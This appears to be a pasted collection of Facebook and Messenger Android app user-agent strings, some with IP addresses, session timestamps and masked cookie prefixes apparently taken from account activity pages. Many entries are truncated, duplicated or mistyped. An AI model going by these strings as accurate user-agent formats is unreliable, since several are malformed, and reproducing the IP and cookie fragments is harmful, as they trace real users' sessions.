Dalvik/2.1.0 (Linux; U; Android 9; SM-A205GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/242.0.0.15.119;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/184324652;FBCR/TM;FBMF/samsung;FBBD/samsung;FBDV/SM-A205GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/
Dalvik/2.1.0 (Linux; U; Android 9; SM-A505GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/182747450;FBCR/GLOBE;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;] FBBK/1 Cookie VaHe******************** Edit
Dalvik/2.1.0 (Linux; U; Android 9; SM-A505GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/182747450;FBCR/GLOBE;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;] FBBK/1
Dalvik/2.1.0 (Linux; U; Android 9; SM-A205GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/242.0.0.15.119;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/184324652;FBCR/TM;FBMF/samsung;FBBD/samsung;FBDV/SM-A205GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1423};FB_FW/1;] FBBK/1
Dalvik/2.1.0 (Linux; U; Android 9; SM-A205GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/242.0.0.15.119;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/184324652;FBCR/TM;FBMF/samsung;FBBD/samsung;FBDV/SM-A205GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1423};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 8.0.0; AGS2-L09 Build/HUAWEIAGS2-L09) [FBAN/Orca-Android;FBAV/238.0.0.14.120;FBPN/com.facebook.orca;FBLC/hu_HU;FBBV/179092826;FBCR/null;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/AGS2-L09;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1200,height=1852};FB_FW/1;]
Created Nov 16, 2019, 6:18 AM Updated Dec 15, 2019, 9:24 PM IP Address 204.14.73.22 Browser Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML713DL Build/OPM1.171019.019) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/en_US;FBBV/187555057;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;] FBBK/1 Cookie 5tz2********************
Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML713DL Build/OPM1.171019.019) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/en_US;FBBV/187555057;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;]
Browser Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML713DL Build/OPM1.171019.019) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/en_US;FBBV/187555057;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;] FBBK/1
Browser Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML414DL Build/OPM1.171019.019) [FBAN/Orca-Android;FBAV/231.0.0.25.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/170889107;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML414DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1196};FB_FW/1;] FBBK/1 Cookie f8z4********************
PPR1.180610.011Dalvik/2.1.0 (Linux; U; Android 9; CPH1987 Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/vi_VN;FBBV/187555175;FBCR/VIETTEL;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1987;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2196};FB_FW/1;] FBBK/1
Dalvik/2.1.0 (Linux; U; Android 9; CPH1987 Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/vi_VN;FBBV/187555175;FBCR/VIETTEL;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1987;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2196};FB_FW/1;] FBBK/1
Dalvik/2.1.0 (Linux; U; Android 7.0; Hisense Hi  3 Build/NRD9OM) [FBAN/FB4A;FBAV/245.0.0.39.118;FBPN/ com.facebook.katana;FBLC/es_MX;FBBV/ 180475968;FBCR/TELCEL;FBMF/Hisense;FBBD/ Hisense;FBDV/Hisense Hi 3;FBSV/7.0;FBCA/armeabi- v7a:armeabi;FBDM/ {density=2.0,width=720height=1280};FB_FW/1;FBRV/181817659;] FBBK/1
Dalvik/2.1.0;(Linux;U;Android 7.0;Hisense-Hi-3;Build/NRD9OM) [FBAN/FB4A;FBAV/245.0.0.39.118;FBPN/ com.facebook.katana;FBLC/es_MX;FBBV/180475968;FBCR/TELCEL;FBMF/Hisense;FBBD/Hisense;FBDV/Hisense-Hi-3;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1280};FB_FW/1;FBRV/181817659;] FBBK/1
Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G930F Build/NRD90M) [FBAN/Orca-Android;FBAV/247.0.0.10.117
IP Address	2600:1005:b14c:91f9:7ec3:cbeb:1d97:bca9 Browser	Dalvik/2.1.0 (Linux; U; Android 9; LM-V405 Build/PKQ1.190202.001) [FBAN/FB4A;FBAV/252.0.0.22.355;FBPN/com.facebook.katana;FBLC/en_US;FBBV/191850142;FBCR/Verizon ;FBMF/LGE;FBBD/lge;FBDV/LM-V405;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2147};FB_FW/1;FBRV/0;]
Navegador Dalvik/2.1.0 (Linux, U; Android 7.0, Hisense Hi 3 Build/NRD90M) [FBAN/Orca-Android,FBAV/ 2391017119 FBPN com.facebook.orca FBLC/es MXFBBV 180535023 FBCR TELCEL, FBMF/Hisense,FBBD/ Hisense FBDV/Hisense Hi 3:FBSV/7.0FBCA / armeabi- v7a armeabi:FBDM (density=20,width=720 height=1280):FB_FW/1:1
Navegador Dalvik/2.1.0 (Linux, U; Android 7.0, HisenseHi3 Build/NRD90M) [FBAN/Orca-Android,FBAV/ 239.10.17.119,FBPN com.facebook.orca FBLC/es MXFBBV 180535023 FBCR TELCEL, FBMF/Hisense,FBBD/ Hisense FBDV/Hisense Hi 3:FBSV/7.0FBCA / armeabi- v7a armeabi:FBDM (density=20,width=720 height=1280):FB_FW/1:1
Dalvik/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920
Dalvik/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 9; POT-LX1 Build/HUAWEIPOT-L01) [FBAN/Orca-Android;FBAV/251.0.0.12.117;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/197803941;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/POT-LX1;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1426};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 10; SM-N975U Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/253.0.0.17.117;FBPN/com.facebook.orca;FBLC/en_US;FBBV/200372525;FBCR/U.S. Cellular;FBMF/samsung;FBBD/samsung;FBDV/SM-N975U;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.5,width=1440,height=2759};FB_FW/1;] FBBK/1
Dalvik/2.1.0 (Linux; U; Android 10; SM-N960F Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/257.1.0.21.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/205865103;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-N960F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2094};FB_FW/1;] FBBK/1
110.54.226.91 BrowserSupportsFresco=1 modular=2 Dalvik/2.1.0 9Linux;U; Android 5.1.1; A37f Build/LMY47V( [FBAN/EMA;UNITY_PACKAGE/1315;FBBV/203779460;FBAV/190.0.0.6.117;FBDV/A37F;FBLC/en_US;FBOP/20;FBNG/4G;FBCQ/UNKNOWN;FBMNT/METERED]
Dalvik/2.1.0 (Linux; U; Android 9; moto e6 Build/PCB29.73-65-3) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782189;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 9; SM-G955F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/255.0.0.14.126;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/202766316;FBCR/SUN;FBMF/samsung;FBBD/samsung;FBDV/SM-G955F;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.5,width=1440,height=2960};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 9; SM-G955F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/255.0.0.14.126;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/202766316;FBCR/SUN;FBMF/samsung;FBBD/samsung;FBDV/SM-G955F;FBSV/9;FBCA/arm64-v8a:null;FBDM
Dalvik/2.1.0 (Linux; U; Android 8.1.0; DRA-LX2 Build/HUAWEIDRA-LX2) [FBAN/Orca-Android;FBAV/239.1.0.17.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/180535023;FBCR/TelkomSA;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/DRA-LX2;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1356};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 7.1.1; E6653 Build/32.4.A.1.54) [FBAN/Orca-Android;FBAV/151.0.0.17.95;FBPN/com.facebook.orca;FBLC/en_ZA;FBBV/89897644;FBCR/null;FBMF/Sony;FBBD/Sony;FBDV/E6653;FBSV/7.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1776};FB_FW/1;] FBBK/1
Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-I9300 Build/IMM76D) [FBAN/\xC2\xADOrca-Android;FBAV/\xC2\xAD5.0.0.16.1;FBLC/\xC2\xADtr_TR;FBBV/\xC2\xAD2302400;FBCR/\xC2\xADT-Mobile;FBMF/\xC2\xADsamsung;FBBD/\xC2\xADsamsung;FBDV/\xC2\xADGT-I9300;FBSV/\xC2\xAD4.0.4;FBCA/\xC2\xADarmeabi-v7a:armeabi;F\xC2\xADBDM/\xC2\xAD{density=1.0,width=10\xC2\xAD66,height=552};]
Dalvik/2.1.0 (Linux; U; Android 10; SM-G970U1 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/78.0.1.18.236;FBPN/com.facebook.mlite;FBLC/es_MX;FBBV/201616056;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/SM-G970U1;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2020};]
Dalvik/2.1.0 (Linux; U; Android 10; POT-LX3 Build/HUAWEIPOT-L03) [FBAN/Orca-Android;FBAV/270.0.0.17.120;FBPN/com.facebook.orca;FBLC/es_MX;FBBV/225129965;FBCR/TELCEL;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/POT-LX3;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2139};FB_FW/1;] Cookie yQHE********************
Dalvik/2.1.0 (Linux; U; Android 7.1.2; KFMUWI Build/NS6315) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782190;FBCR/null;FBMF/Amazon;FBBD/Amazon;FBDV/KFMUWI;FBSV/7.1.2;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.0,width=600,height=976};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 10; Pixel 3 Build/QQ3A.200605.001) [FBAN/Orca-Android;FBAV/271.0.0.11.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/227270208;FBCR/Verizon;FBMF/Google;FBBD/google;FBDV/Pixel 3;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2028};FB_FW/1;] FBBK/1\
SupportsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android 8.1.0; W-K200 Build/O11019) [FBAN/EMA;UNITY_PACKAGE/1549;FBBV/234444154;FBAV/209.0.0.5.119;FBDV/W-K200;FBLC/vi_VN;FBOP/20;FBNG/3G;FBCQ/UNKNOWN;FBMNT/METERED] Cookie vO4n********************
Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29) [FBAN/Orca-Android;FBAV/272.0.0.14.119;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/228977692;FBCR/vodafone ES;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/VOG-L29;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2265};FB_FW/1;] FBBK/1
Dalvik/2.1.0 (Linux; U; Android 8.0.0; moto e5 plus Build/OPPS27.91-179-8-16) [FBAN/FB4A;FBAV/287.0.0.50.119;FBPN/com.facebook.katana;FBLC/es_MX;FBBV/243660864;FBCR/null;FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.7,width=720,height=1358};FB_FW/1;FBRV/0;]
Dalvik/2.1.0 (Linux; U; Android 9; SM-J730F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/245106334;FBCR/Plus;FBMF/samsung;FBBD/samsung;FBDV/SM-J730F;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=1920};FB_FW/1;]
SupportsFresco=1 modular=2 Dalvik/2.1.0 (Linux; U; Android 9; ASUS_X00QD Build/PPR1.180610.009) [FBAN/EMA;UNITY_PACKAGE/1634;FBBV/244867833;FBAV/216.0.0.10.121;FBDV/ASUS_X00QD;FBLC/pt_BR;FBOP/20;FBNG/4G;FBCQ/UNKNOWN;FBMNT/METERED]
Dalvik/2.1.0 (Linux; U; Android 10; SM-A505GT Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/245106389;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GT;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2113};FB_FW/1
Dalvik/2.1.0 (Linux; U; Android 10; SM-A505GT Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/245106389;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GT;FBSV/10;FBCA/arm64-
Dalvik/2.1.0 (Linux; U; Android 10; Redmi Note 7 MIUI/V11.0.1.0.QFGEUXM) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/cs_CZ;FBBV/245106389;FBCR/null;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 7;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2131};FB_FW/1;] FBBK/1
Dalvik/2.1.0 (Linux; U; Android 10; EVR-N29 Build/HUAWEIEVR-N29) [FBAN/Orca-Android;FBAV/283.0.0.16.120;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/246887380;FBCR/O2 - UK;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/EVR-N29;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2068};FB_FW/1;] FBBK/1
Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G532G Build/MMB29T) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G532G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]
Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G960U Build/R16NW) [FBAN/Orca-Android;FBAV/260.0.0.22.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/209190396;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G960U;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2076};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 9; SM-G950U Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/245106389;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G950U;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2076};FB_FW/1;] FBBK/1
Dalvik/2.1.0 (Linux; U; Android 7.0; LG-H901 Build/NRD90U) [FBAN/Orca-Android;FBAV/286.0.0.21.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/250669427;FBCR/T-Mobile;FBMF/LGE;FBBD/lge;FBDV/LG-H901;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2392};FB_FW/1;] FBBK/1
Dalvik/2.1.0 (Linux; U; Android 9; SM-A305F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/274.0.0.18.120;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/232793953;FBCR/airtel;FBMF/samsung;FBBD/samsung;FBDV/SM-A305F;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1
Dalvik/2.1.0 (Linux; U; Android 7.1.1; CPH1727 Build/N6F26Q) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/253310646;FBCR/AIS;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1727;FBSV/7.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.7,width=1080,height=2016};FB_FW/1;] FBBK/1
201.162.161.185 Navegador	Dalvik/2.1.0 (Linux; U; Android 9; ZTE Blade A5 2019 Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/269.0.0.15.119;FBPN/com.facebook.orca;FBLC/es_US;FBBV/221129137;FBCR/Movistar;FBMF/ZTE;FBBD/ZTE;FBDV/ZTE Blade A5 2019;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 5.1.1; oppo r7sm Build/LYZ28N) [FBAN/EMA;UNITY_PACKAGE/1590;FBBV/0;FBAV/26.0.0.4.133;FBDV/oppo r7sm;FBLC/en_US;FBOP/20]
Dalvik/2.1.0 (Linux; U; Android 10; SM-S111DL Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/291.2.0.22.114;FBPN/com.facebook.orca;FBLC/en_US;FBBV/257752740;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-S111DL;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1431};FB_FW/1;] FBBK/1
Supportsfresco=1modular=2Dalvik/2.1.0(Linux;v; Android;D6.0;LG_X230build/MRA58K)[FBAN/EMA;UNITY_PACKAGE/1826;FBBV/262675052.fbav/230.0.0.3.121;fbdv/lg_x230;fblc/es_ES,FBOP/20,fbng/wifi,fbcq/con.moblica,common x mob.protocol.data connectionQualitydata@48e505d8;fbmnt/not_metereo]cookie46p3
Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J410G Build/M1AJB) [FBAN/Orca-Android;FBAV/291.2.0.22.114;FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/257752740;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-J410G;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1384};FB_FW/1;] FBBK/1
Dalvik/2.1.0 (Linux; U; Android 8.1.0; DUB-LX1 Build/HUAWEIDUB-LX1) [FBAN/Orca-Android;FBAV/291.2.0.22.114;FBPN/com.facebook.orca;FBLC/en_US;FBBV/257752740;FBCR/VIVACOM;FBMF
Dalvik/2.1.0 (Linux; U; Android 8.1.0; DUB-LX1 Build/HUAWEIDUB-LX1) [FBAN/Orca-Android;FBAV/291.2.0.22.114;FBPN/com.facebook.orca;FBLC/en_US;FBBV/257752740;FBCR/VIVACOM;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/DUB-LX1;FBSV/8.1.0;FBCA
c5c0:94bd:bdf0 Browser	Dalvik/2.1.0 (Linux; U; Android 9; LM-X120 Build/PKQ1.180904.001) [FBAN/Orca-Android;FBAV/293.0.0.14.232;FBPN/com.facebook.orca;FBLC/en_CA;FBBV/261339538;FBCR/Lucky;FBMF/LGE;FBBD/lge;FBDV/LM-X120;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=480,height=888};FB_FW/1;]
IP Address 210.185.171.163 Browser Dalvik/2.1.0 (Linux; U; Android 10; YAL-L21 Build/ HUAWEIYAL-L61) [FBAN/Orca- Android;FBAV/301.0.0.12.112;F BPN/com.facebook.orca;FBLC/ en_GB;FBBV/274784541;FBCR/ TM;FBMF/HUAWEI;FBBD/ HUAWEI;FBDV/YAL-L21;FBSV/ 10;FBCA/arm64-v8a:null;FBDM/ {density=2.55,width=1080,height =2110};FB_FW/1;] Cookie CPo-*****
Dalvik/2.1.0 (Linux; U; Android 5.1.1; Lenovo A6020a46 Build/LMY47V) [FBAN/Orca-Android;FBAV/251.0.0.12.117;FBPN/com.facebook.orca;FBLC/ru_RU;FBBV/197803937;FBCR/lifecell;FBMF/LENOVO;FBBD/Lenovo;FBDV/Lenovo A6020a46;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;] FBBK/
Dalvik/2.1.0 (Linux; U; Android 9; FIG-LX1 Build/HUAWEIFIG-L31) [FBAN/Orca-Android;FBAV/302.0.0.11.117;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/275958904;FBCR/Yoigo;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/FIG-LX1;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2032};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 9; Kirin Treble Build/PQ2A.190405.003) [FBAN/FB4A;FBAV/306.1.0.40.119;FBPN/com.facebook.katana;FBLC/ru_US;FBBV/273922298;FBCR/life:) BY;FBMF/HUAWEI;FBBD/Huawei;FBDV/Kirin Treble;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.4,width=1080,height=2075};FB_FW/1;FBRV/275142282;]
Dalvik/2.1.0 (Linux; U; Android 11; SM-G973F Build/RP1A.200720.012) [FBAN/Orca-Android;FBAV/299.0.0.11.115;FBPN/com.facebook.orca;FBLC/de_DE;FBBV/272301973;FBCR/vodafone.de;FBMF/samsung;FBBD/samsung;FBDV/SM-G973F;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2042};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G925F Build/NRD90M) [FBAN/Orca-Android;FBAV/304.2.0.17.118;FBPN/com.facebook.orca;FBLC/ar_AE;FBBV/279457446;FBCR/Vodafone;FBMF/samsung;FBBD/samsung;FBDV/SM-G925F;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2560};FB_FW/1;] FBBK/1
Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G955F Build/NRD90M) Source/1 [FBAN/EMA;UNITY_PACKAGE/749;FBBV/154200404;FBAV/146.0.0.9.102;FBDV/SM-G955F;FBLC/vi_VN;FBOP/20]
Created Apr 13, 2021, 2:01 PM Updated Apr 13, 2021, 2:01 PM IP Address 103.25.250.236 Browser Dalvik/2.1.0 (Linux; U; Android 10; SM-A515F Build/QP1A.190711.020) [FBAN/FB4A;FBAV/310.0.0.50.118;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/278533704;FBCR/airtel;FBMF/samsung;FBBD/samsung;FBDV/SM-A515F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2186};FB_FW/1;FBRV/0;]
Created Apr 13, 2021, 6:19 AM Updated Apr 13, 2021, 12:48 PM IP Address 103.25.250.236 Browser Dalvik/2.1.0 (Linux; U; Android 10; SM-A515F Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/305.1.0.16.117;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/280282233;FBCR/airtel;FBMF/samsung;FBBD/samsung;FBDV/SM-A515F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2186};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 5.1; HUAWEI LUA-L21 Build/HUAWEILUA-L21) [FBAN/MessengerLite;FBAV/133.0.0.1.116;FBPN/com.facebook.mlite;FBLC/cs_CZ;FBBV/279951921;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/HUAWEI LUA-L21;FBSV/5.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=480,height=854};]
SupportsFresco=1 modular=2 Dalvik/2.1.0 (Linux; U; Android 5.1; HUAWEI LUA-L21 Build/HUAWEILUA-L21) [FBAN/EMA;UNITY_PACKAGE/2014;FBBV/282877419;FBAV/245.0.0.9.119;FBDV/HUAWEI LUA-L21;FBLC/cs_CZ;FBOP/20;FBNG/WIFI;FBMNT/NOT_METERED]
IP Address 103.25.251.238 Browser Dalvik/2.1.0 (Linux; U; Android 10; SM-A515F Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/305.1.0.16.117;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/280282233;FBCR/airtel;FBMF/samsung;FBBD/samsung;FBDV/SM-A515F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2186};FB_FW/1;] Cookie NQ1f********************
Dalvik/2.1.0 (Linux; U; Android 8.0.0; ATU-L31 Build/HUAWEIATU-L31) [FBAN/MessengerLite;FBAV/126.0.0.1.117;FBPN/com.facebook.mlite;FBLC/cs_CZ;FBBV/271069048;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/ATU-L31;FBSV/8.0.0;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1358};]
Dalvik/2.1.0 (Linux; U; Android 8.0.0; ATU-L31 Build/HUAWEIATU-L31) [FBAN/MessengerLite;FBAV/126.0.0.1.117;FBPN/com.facebook.mlite;FBLC/cs_CZ;FBBV/271069048;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/ATU-L31;FBSV/8.0.0;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1358};] Soubor cookie SryV********************
